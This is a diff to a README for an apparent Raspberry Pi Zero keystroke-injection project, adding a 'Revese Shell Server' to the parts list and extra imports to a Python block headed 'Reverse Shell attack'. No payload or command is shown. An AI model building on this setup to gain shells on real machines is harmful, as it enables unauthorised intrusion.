@@ -2,6 +2,7 @@
 
 - Raspberry Pi Zero
 - Micro usb to usb A adapter
+- Revese Shell Server
 - (optional) [Micro usb to usb A dongle](https://52pi.com/collections/raspberry-pi-zero/products/52pi-usb-dongle-for-raspberry-pi-zero-zero-w)
 
 # Setup
@@ -41,7 +42,9 @@ sudo reboot
 # Reverse Shell attack
 
 ```python
-from zero_hid import Keyboard
+from zero_hid import Keyboard, KeyCodes
+from zero_hid.hid import keycodes
+from time import sleep
 
 
 with Keyboard() as k:
